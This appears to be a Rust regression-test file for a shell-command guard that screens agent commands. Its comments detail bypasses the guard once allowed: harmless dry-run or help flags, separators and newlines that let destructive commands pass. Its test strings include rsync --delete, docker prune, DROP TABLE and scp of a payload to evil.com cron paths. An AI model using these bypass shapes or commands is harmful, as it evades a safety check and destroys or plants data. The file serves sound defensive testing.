//! A safe pattern exempts the command it covers, not the whole line.
//!
//! `.agent-config-it2wk`. `Pack::matches_safe` answers "does a safe pattern
//! appear anywhere in this command", which is a different question from "is THIS
//! destructive match safe". In a compound command the two come apart, and the
//! bypasses below were all ALLOWED by the live guard before this was fixed.
//!
//! Two defects had to be closed for them to deny, and neither alone is enough:
//!
//! 1. A safe match anywhere exempted the whole pack, so a harmless
//!    `rsync --dry-run` in a LATER command whitelisted the `rsync --delete` in
//!    front of it. Narrowing the wildcard does not fix this: the regex is still
//!    free to match the later segment.
//! 2. A safe pattern's `.*` reached across `;`, `&&` and `|`, so one span could
//!    cover both the harmless flag and the destructive command. Span-scoping
//!    does not fix this on its own either: the span genuinely did contain both.
//!
//! These cases cannot live in `tests/corpus/`. That harness runs
//! `Config::default()`, which does not enable the `remote` pack, so every case
//! here would pass by never being evaluated — green over nothing.

use std::collections::HashSet;

use destructive_command_guard::allowlist::LayeredAllowlist;
use destructive_command_guard::config::Config;
use destructive_command_guard::evaluate_command_with_pack_order;
use destructive_command_guard::packs::REGISTRY;

/// Evaluate with `core` + `remote` enabled, the shape this machine actually runs.
fn is_denied(command: &str) -> bool {
    is_denied_with(&["core", "remote"], command)
}

/// Evaluate with exactly `packs` enabled.
fn is_denied_with(packs: &[&str], command: &str) -> bool {
    let config = Config::default();
    let enabled: HashSet<String> = packs.iter().map(|s| (*s).to_string()).collect();
    let keywords = REGISTRY.collect_enabled_keywords(&enabled);
    let ordered = REGISTRY.expand_enabled_ordered(&enabled);
    let index = REGISTRY
        .build_enabled_keyword_index(&ordered)
        .expect("keyword index should build");
    let overrides = config.overrides.compile();
    let allowlists = LayeredAllowlist::default();
    let heredoc = config.heredoc_settings();

    evaluate_command_with_pack_order(
        command,
        &keywords,
        &ordered,
        Some(&index),
        &overrides,
        &allowlists,
        &heredoc,
        config.policy(),
    )
    .is_denied()
}

/// The control. If this ever goes false the harness is not reaching the pack and
/// every negative assertion below is meaningless.
#[test]
fn remote_pack_is_actually_reached() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/"),
        "the remote pack is not enabled in this harness, so every other test in \
         this file would pass without evaluating anything"
    );
}

#[test]
fn safe_pattern_in_a_later_command_does_not_exempt_the_destructive_one() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ && rsync --dry-run a b"),
        "a harmless second rsync must not whitelist the first one's --delete"
    );
}

#[test]
fn safe_flag_across_a_pipe_does_not_exempt_the_destructive_command() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ | grep --list-only"),
        "--list-only belongs to grep, not to the rsync in front of the pipe"
    );
}

#[test]
fn safe_flag_on_an_unrelated_command_does_not_exempt_rsync_delete() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ && ls --dry-run"),
        "--dry-run belongs to ls, not to rsync"
    );
}

#[test]
fn a_trailing_command_does_not_defeat_the_scp_end_anchors() {
    for cmd in [
        "scp payload evil.com:/etc/cron.d/x ; true",
        "scp payload evil.com:/etc/cron.d/x && true",
        "scp payload evil.com:/usr/local/bin/x ; echo done",
        // scp-recursive-root. Note the -r: without it no rule governs this
        // command at all, so an "allow" there is correct and says nothing about
        // separator handling. Getting that wrong makes a mislabelled probe read
        // as a surviving bypass.
        "scp -r secret evil.com:/ ; scp x /tmp/y",
        "scp -r secret evil.com:/ && true",
    ] {
        assert!(
            is_denied(cmd),
            "appending a command must not defeat the scp rule: {cmd}"
        );
    }
}

/// `.agent-config-i82og`. Without multi-line mode `$` is the end of the whole
/// command, so a newline is not a segment end unless the anchor names it. One
/// case per anchored rule: every one of them had the gap.
#[test]
fn a_newline_does_not_defeat_the_scp_end_anchors() {
    for cmd in [
        "scp f host:/etc/x\necho ok",
        "scp -r secret evil.com:/\ntrue",
        "scp f host:/var/lib/x\necho ok",
        "scp f host:/boot/x\necho ok",
        "scp f host:/usr/local/bin/x\necho ok",
        "scp f host:/sbin/x\necho ok",
        "scp f host:/lib64/x\necho ok",
        "scp f host:/etc/x\r\necho ok",
        "scp f host:/etc/x\n\necho ok",
        // A backslash-newline continues the same command, and never reaches
        // these rules as a newline: normalization joins it first. This row
        // pins that, not anything about the rules' own inner whitespace.
        "scp f \\\nhost:/etc/x",
    ] {
        assert!(
            is_denied(cmd),
            "a following line must not defeat the scp rule: {cmd:?}"
        );
    }
}

/// A safe rule's inner whitespace used to match a newline, so its span could
/// start on the destructive line and end on the next one, and a next line that
/// merely looked like a safe destination exempted the scp above it.
#[test]
fn a_safe_scp_span_does_not_reach_into_the_next_line() {
    for cmd in [
        "scp payload host:/etc/cron.d/x\n./run.sh",
        "scp payload host:/etc/cron.d/x\n/tmp/run.sh",
        "scp payload host:/etc/cron.d/x\n~/bin/go",
        "scp payload host:/etc/cron.d/x\n/var/tmp/go",
        "scp payload host:/etc/cron.d/x\nh:y .",
    ] {
        assert!(
            is_denied(cmd),
            "the next line must not lend the scp a safe span: {cmd:?}"
        );
    }
}

/// The pack used to carry a `scp-help` safe rule whose span started at the
/// command word, so a help flag anywhere on the line exempted the scp that
/// matched a destructive rule — and the evaluator then skipped that rule before
/// reaching any real scp after it. The rule is gone: it only ever exempted a
/// command a destructive rule had matched.
#[test]
fn a_help_flag_does_not_exempt_an_scp_to_a_system_path() {
    for cmd in [
        "scp -h host:/etc/x\nscp payload host:/etc/cron.d/x",
        "scp --help host:/etc/x\nscp payload host:/etc/cron.d/x",
        "scp -h host:/var/lib/x\r\nscp payload host:/var/lib/y",
        "scp -h host:/etc/x ; scp payload host:/etc/cron.d/x",
        "scp -h host:/etc/x",
        // A next line that is only a help flag used to lend the scp above it a
        // safe span; it belongs to the deleted rule, not to span scoping.
        "scp payload host:/etc/cron.d/x\n-h",
        // `-h` is the argument to `-i`, so ssh only warns and the copy happens.
        "scp -i -h f host:/etc/x",
        "scp -F --help f host:/usr/bin/x",
    ] {
        assert!(
            is_denied(cmd),
            "a help flag must not exempt an scp to a system path: {cmd:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// The other direction: scoping must not deny a genuinely safe command.
// ---------------------------------------------------------------------------

#[test]
fn genuinely_safe_commands_are_still_allowed() {
    for cmd in [
        // The safe match ends at --dry-run while the destructive one runs on to
        // --delete. Requiring the whole destructive span to be CONTAINED in the
        // safe span would deny these; the test is on the match's start.
        "rsync -a --delete --dry-run /src/ /dst/",
        "rsync --dry-run -a --delete /src/ /dst/",
        "rsync -a --delete --list-only /src/ /dst/",
        "scp host:/etc/hosts /tmp/hosts",
        // A system path that is not the destination stays allowed when a line
        // follows, so the newline anchor did not widen what counts as a target.
        "scp host:/etc/hosts /tmp/hosts\necho ok",
        "scp /etc/hosts user@host:/home/user/\necho ok",
        // scp-to-var matches these; the /var/tmp safe rule must still exempt them
        // with its inner whitespace kept on one line.
        "scp f host:/var/tmp/x",
        "scp f\thost:/var/tmp/x",
        "scp f host:/var/tmp/x\n",
        // No safe rule covers a bare help invocation, and none has to: no
        // destructive rule matches a command with no destination path.
        "scp --help",
        "scp -h",
        "ssh-keygen -l -f ~/.ssh/id_ed25519.pub",
    ] {
        assert!(!is_denied(cmd), "must stay allowed: {cmd}");
    }
}

// ---------------------------------------------------------------------------
// An exempted match does not end the search (.agent-config-35ysf).
//
// A rule used to take its FIRST match in the line and, when a safe span covered
// that match, `continue` to the next rule. A destructive command later in the
// same line was never searched, so a dry run in front of a real delete allowed
// the delete.
// ---------------------------------------------------------------------------

#[test]
fn an_exempted_match_does_not_hide_a_later_destructive_command() {
    for cmd in [
        "rsync --dry-run --delete a b && rsync -a --delete /src/ /dst/",
        // More than one exemption in front: the search has to keep going past
        // each of them, not just past the first.
        "rsync --dry-run --delete a b ; rsync -n --delete c d && rsync -a --delete /src/ /dst/",
        // A safe command behind the real one as well as in front of it.
        "rsync -n --delete a b && rsync -a --delete /src/ /dst/ && rsync --dry-run --delete e f",
        // These destructive regexes run across `&&` and `;`, so the exempted
        // match ENDS past the real command. Resuming after the destructive match
        // instead of after the safe span would skip it; rsync's regex stops at
        // the separator and cannot tell the two apart.
        "git clean -n && git clean -fd",
        "git checkout -b feat && git reset --hard",
        "ssh -V ; ssh host sudo rm x",
    ] {
        assert!(
            is_denied(cmd),
            "the real destructive command must be found: {cmd}"
        );
    }
}

/// Searching on never clears a line the first match denied.
///
/// This is the evaluator's decision, before main.rs applies severity; the
/// hook-level form is in `tests/cli_e2e.rs`. Before an exemption the spans are
/// each safe pattern's first match, as they always were. traefik's `docker\s+(?:inspect|logs)\s+.*\btraefik\b` and
/// cloudflare's `curl\b.*\s-X\s*GET\b.*` run past `;` and `&&`, so a LATER match
/// of either swallows the destructive command after it. Letting those later
/// matches exempt from the start turned each line below from deny to allow.
/// The shorter lines without the first command are allowed today, which is the
/// wide-pattern shape `.agent-config-it2wk` left in these packs, not this one.
#[test]
fn searching_on_never_allows_a_line_the_first_match_denied() {
    for (pack, cmd) in [
        (
            "loadbalancer.traefik",
            "docker logs traefik\ndocker logs traefik ; docker kill traefik",
        ),
        (
            "loadbalancer.traefik",
            "kubectl describe ingressroute my-route\n\
             kubectl get ingressroute && kubectl delete ingressroute my-route",
        ),
        (
            "dns.cloudflare",
            "curl -X GET https://api.cloudflare.com/client/v4/zones\n\
             curl -X GET https://api.cloudflare.com/client/v4/zones && \
             curl -X DELETE https://api.cloudflare.com/client/v4/zones/abc",
        ),
    ] {
        assert!(is_denied_with(&[pack], cmd), "must stay denied: {cmd}");
    }
}

// ---------------------------------------------------------------------------
// A safe pattern written with a bare `.*` reaches across separators, so its span
// used to end AFTER the destructive command that followed it, and the search
// resumed past that command without judging it (.agent-config-qte7t). Spans are
// now clamped to the command they start in, so the width of the regex no longer
// decides how far the exemption reaches.
//
// These packs are not in `Config::default()`, so a corpus case would be green
// over nothing — the enabled set has to be passed explicitly, and the first
// assertion in each block is the control that it was.
// ---------------------------------------------------------------------------

#[test]
fn a_wide_safe_pattern_does_not_exempt_the_command_in_front_of_it() {
    // Collected, not asserted in the loop: an assert here stops at the first
    // case, so one regression hid how many of the thirteen narrowed rules and
    // the per-command haystack were actually pinned.
    let mut unreached = Vec::new();
    let mut allowed = Vec::new();
    for (packs, destructive, bypass) in [
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker ps && docker system prune -af && docker build . --dry-run",
        ),
        (
            ["core", "containers"],
            "docker rm -f c1",
            "docker ps && docker rm -f c1 && docker build . --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "kubectl delete namespace prod",
            "kubectl get pods && kubectl delete namespace prod && kubectl apply -f x.yaml --dry-run=client",
        ),
        (
            ["core", "kubernetes"],
            "helm uninstall prod-release",
            "helm list && helm uninstall prod-release && helm upgrade x y --dry-run",
        ),
        // The same bug spelled as a negative lookahead: `(?!.*--dry-run)` asked
        // whether the flag appears ANYWHERE later on the line, so a dry run in a
        // later command cancelled the denial and there was no match to exempt.
        (
            ["core", "kubernetes"],
            "kubectl delete deployment api",
            "kubectl get pods && kubectl delete deployment api && kubectl apply -f x.yaml --dry-run",
        ),
        (
            ["core", "package_managers"],
            "npm publish",
            "npm ci && npm publish && npm publish --dry-run",
        ),
        (
            ["core", "package_managers"],
            "cargo publish",
            "cargo build && cargo publish && cargo publish --dry-run",
        ),
        // The destructive command FIRST. Clamping a span's end does not reach
        // this: the safe match still begins on the destructive command's own
        // command word, so the exemption fires exactly as before. Only matching
        // the safe pattern against one command at a time closes it. Every case
        // above puts a harmless command first, which is the shape that hid this.
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker system prune -af && docker build . --dry-run",
        ),
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker system prune -af ; docker build . --dry-run",
        ),
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker system prune -af | docker build . --dry-run",
        ),
        (
            ["core", "containers"],
            "docker rm -f c1",
            "docker rm -f c1 && docker build . --dry-run",
        ),
        (
            ["core", "package_managers"],
            "npm publish",
            "npm publish && npm publish --dry-run",
        ),
        (
            ["core", "package_managers"],
            "cargo publish",
            "cargo publish && cargo publish --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "helm uninstall prod-release",
            "helm uninstall prod-release && helm upgrade x y --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "kubectl delete namespace prod",
            "kubectl delete namespace prod && kubectl apply -f x.yaml --dry-run=client",
        ),
        // A safe pattern that matches the LINE and no single command speaks for
        // neither. Reading empty spans as "the RegexSet and the patterns
        // disagree" skipped the whole pack, which is the same bypass with the
        // dry run detached from any command. (`echo` is not the probe to use
        // here: that line denies either way, so it proves nothing about this.)
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker system prune -af && cat --dry-run",
        ),
        (
            ["core", "containers"],
            "docker system prune -af",
            "docker system prune -af | tee --dry-run",
        ),
        // A safe pattern whose meaning depends on text OUTSIDE its command must
        // keep the whole line as its haystack. `kustomize\s+build(?!\s*\|)` says
        // "a kustomize build that is NOT piped anywhere"; shown one command it
        // cannot see the pipe, matches the left half of the pipeline the
        // Critical rule blocks, and exempts it. "Preview with kubectl diff, then
        // delete" is the idiom that rule exists for.
        (
            ["core", "kubernetes"],
            "kustomize build | kubectl delete -f -",
            "kustomize build | kubectl diff -f - && kustomize build | kubectl delete -f -",
        ),
        (
            ["core", "kubernetes"],
            "kustomize build | kubectl delete -f -",
            "kustomize build | kubectl diff -f - ; kustomize build | kubectl delete -f -",
        ),
        (
            ["core", "kubernetes"],
            "kustomize build | kubectl delete -f -",
            "kustomize build | kubectl apply --dry-run=client -f - && kustomize build | kubectl delete -f -",
        ),
    ] {
        // Control: the pack is reached and the command is destructive on its own.
        // Without this, a bypass that stops being evaluated reads as fixed.
        if !is_denied_with(&packs, destructive) {
            unreached.push(format!(
                "{packs:?} does not reach its rule for {destructive:?}"
            ));
            continue;
        }
        if !is_denied_with(&packs, bypass) {
            allowed.push(format!("{bypass:?} (control {destructive:?} denies)"));
        }
    }
    assert!(
        unreached.is_empty(),
        "controls failed, so the negative results below mean nothing: {unreached:#?}"
    );
    assert!(
        allowed.is_empty(),
        "a dry run elsewhere on the line exempted the destructive command: {allowed:#?}"
    );
}

/// An anchored safe pattern is about its own command, and a leading newline is
/// not a way to turn its pack off.
///
/// `^\s*SELECT` read against the whole line means "the LINE starts with SELECT",
/// so the SELECT spoke for the `DROP TABLE` after it. And when a span was merely
/// clamped, a line whose first byte is a separator produced a zero-width span,
/// which the evaluator read as a RegexSet disagreement and used to skip
/// `database.*` wholesale (.agent-config-qte7t).
#[test]
fn a_select_does_not_speak_for_the_statement_after_it() {
    let packs = ["core", "database"];
    // Control: the destructive rule is reachable in this harness at all.
    assert!(
        is_denied_with(&packs, "DROP TABLE users"),
        "control failed — the database pack is not reaching drop-table"
    );
    for cmd in [
        "SELECT 1; DROP TABLE users",
        "\nSELECT 1; DROP TABLE users",
        "\n\nSELECT 1; DROP TABLE users",
        " \nSELECT 1; DROP TABLE users",
        "\tSELECT 1; DROP TABLE users",
        "\nSELECT 1; DELETE FROM users",
        "\nSELECT 1; TRUNCATE TABLE users",
        "\nSHOW TABLES; DROP TABLE users",
        "\nEXPLAIN SELECT 1; DROP TABLE users",
    ] {
        assert!(
            is_denied_with(&packs, cmd),
            "a leading read-only statement must not exempt the one after it: {cmd:?}"
        );
    }
}

#[test]
fn a_wide_safe_pattern_still_exempts_its_own_command() {
    // Control: these packs deny something, so an "allowed" below is a verdict
    // and not a pack that was never reached.
    for (packs, destructive) in [
        (["core", "containers"], "docker system prune -af"),
        (["core", "kubernetes"], "kubectl delete namespace prod"),
        (["core", "package_managers"], "npm publish"),
    ] {
        assert!(
            is_denied_with(&packs, destructive),
            "control failed — {packs:?} is not reaching its rule for: {destructive}"
        );
    }

    for (packs, cmd) in [
        (["core", "containers"], "docker build . --dry-run"),
        (
            ["core", "containers"],
            "docker ps && docker build . --dry-run",
        ),
        (
            ["core", "containers"],
            // The clamp reads the tokenizer, which is quote-aware: the `&&`
            // inside the quoted argument ends no command, so the span still
            // reaches its own `--dry-run`.
            "docker build . -t \"a && b\" --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "kubectl apply -f x.yaml --dry-run=client",
        ),
        (["core", "kubernetes"], "helm upgrade x y --dry-run"),
        // The narrowed lookaheads must still exempt their OWN command's flag,
        // which is the whole point of the flag.
        (
            ["core", "kubernetes"],
            "helm uninstall prod-release --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "kubectl delete deployment api --dry-run=client",
        ),
        (["core", "package_managers"], "npm publish --dry-run"),
        (["core", "package_managers"], "cargo publish --dry-run"),
        (
            ["core", "package_managers"],
            "npm ci && npm publish --dry-run",
        ),
        // The narrowed lookaheads use a plain `[^;&|\n]*`, which is not
        // quote-aware, so a quoted `|` truncates a rule's view of its own
        // command and the publish matches. yarn, pnpm and poetry had no dry-run
        // safe pattern to catch that; now they do.
        (
            ["core", "package_managers"],
            "yarn publish --tag \"a|b\" --dry-run",
        ),
        (
            ["core", "package_managers"],
            "pnpm publish --tag \"a|b\" --dry-run",
        ),
        // A `|` inside `$( … )` used to end the command twice over: it truncated
        // the narrowed lookahead's view AND split the safe pattern's haystack,
        // so the dry run could not exempt the publish it belongs to. `$( … )` is
        // an argument, not a command boundary.
        (
            ["core", "package_managers"],
            "npm publish $(cat args | head -1) --dry-run",
        ),
        (
            ["core", "package_managers"],
            "cargo publish --manifest-path $(ls */Cargo.toml | head -1) --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "helm uninstall prod --namespace $(kubectl get ns -o name | head -1) --dry-run",
        ),
        (
            ["core", "kubernetes"],
            "kubectl delete deployment $(kubectl get deploy -o name | head -1) --dry-run=client",
        ),
    ] {
        assert!(!is_denied_with(&packs, cmd), "must stay allowed: {cmd}");
    }
}

#[test]
fn every_command_a_safe_pattern_covers_stays_exempt() {
    for cmd in [
        // The same safe pattern covers both commands. Searching on past the
        // first exemption reaches the second --delete, which only stays allowed
        // if the safe pattern's second match is a span too.
        "rsync --dry-run --delete a b && rsync --dry-run --delete c d",
        "rsync -n --delete a b ; rsync --dry-run --delete c d ; rsync --list-only --delete e f",
    ] {
        assert!(!is_denied(cmd), "must stay allowed: {cmd}");
    }
}
